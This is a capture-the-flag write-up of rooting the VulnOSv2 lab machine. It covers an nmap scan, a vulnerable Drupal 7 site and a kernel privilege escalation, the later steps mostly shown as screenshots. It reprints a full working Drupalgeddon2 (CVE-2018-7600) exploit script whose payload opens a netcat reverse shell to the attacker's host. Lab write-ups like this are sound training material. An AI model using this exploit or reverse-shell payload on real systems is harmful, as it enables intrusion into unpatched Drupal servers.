---
layout: default
title : muzec - VulnOSv2 Writeup
---

VulnOS are a series of vulnerable operating systems packed as virtual images to enhance penetration testing skills.

Your assignment is to pentest a company website, get root of the system and read the final flag aslo rated an OSCP like machine it really fun grab a copy here [Download VulnOSv2 Here](https://www.vulnhub.com/entry/vulnos-2,147/) .

![image](https://user-images.githubusercontent.com/69868171/119294070-a39f4980-bc21-11eb-97ba-35675844ae35.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/vulnos2]
└─$ nmap -sC -sV -oA nmap 172.16.139.181 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-23 20:53 EDT
Nmap scan report for 172.16.139.181
Host is up (0.00020s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
|   256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
|_  256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: VulnOSv2
6667/tcp open  irc     ngircd
Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.51 seconds
```

Not wasting to much of time we are checking the HTTP port first to see what is running on the web server very important.

![image](https://user-images.githubusercontent.com/69868171/119294070-a39f4980-bc21-11eb-97ba-35675844ae35.png)

Clicking on the website link redirect us to another page which seems to be running drupal 7 `http://172.16.139.181/jabc/` not going to explain how to exploit drupal 7 again i think have explaing through out my recent post.

![image](https://user-images.githubusercontent.com/69868171/119294734-207ef300-bc23-11eb-84ce-51cdc35b23fb.png)

Seems we know drupal 7 is vulnerable let get our reverse shell.

![image](https://user-images.githubusercontent.com/69868171/119294895-80759980-bc23-11eb-8dcb-6ac5712e5a91.png)

Running our exploit give us back a reverse and we spawn a TTY shell cool right?? if you are having problem on how to exploit the drupal 7 exploit code below;

```
#!/usr/bin/env python3

"""
Written by Christian Mehlmauer
  https://firefart.at/
  https://twitter.com/_FireFart_
  https://github.com/FireFart

This script can be obtained from:
  https://github.com/FireFart/CVE-2018-7600

Requirements:
  - python3
  - python requests (pip install requests)

Usage:
  - Install dependencies
  - modify the HOST variable in the script
  - run the code
  - win
"""

import requests
import re

HOST="http://172.16.139.181/jabc/"

get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.20.10.4 1337 >/tmp/f', 'name[#type]':'markup'}
post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
r = requests.post(HOST, data=post_params, params=get_params)

m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
if m:
    found = m.group(1)
    get_params = {'q':'file/ajax/name/#value/' + found}
    post_params = {'form_build_id':found}
    r = requests.post(HOST, data=post_params, params=get_params)
    print(r.text)
```

Save in a file in python edit the host and the port to get a reverse shell it easy now let move to the next part.

![image](https://user-images.githubusercontent.com/69868171/119295166-23c6ae80-bc24-11eb-9c15-24ba9602cca9.png)

We don't have access to any of the user directory let check the version the server is running maybe it the way to root.

### Privilege Escalation

![image](https://user-images.githubusercontent.com/69868171/119295262-67211d00-bc24-11eb-8dd7-51f053516891.png)

Cool it running old version checking for available exploit.

![image](https://user-images.githubusercontent.com/69868171/119295333-9c2d6f80-bc24-11eb-9fa8-a062dcd480c9.png)

Let download it to the target and compile it.

![image](https://user-images.githubusercontent.com/69868171/119295503-f7f7f880-bc24-11eb-9c47-8dbdb417c15b.png)

Now let run it.

![image](https://user-images.githubusercontent.com/69868171/119295560-12ca6d00-bc25-11eb-926f-f7ce54cebf60.png)

We are root let get the flag.txt .

![image](https://user-images.githubusercontent.com/69868171/119295603-2d9ce180-bc25-11eb-89e8-ec8b41739d27.png)

Box rooted and we are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>


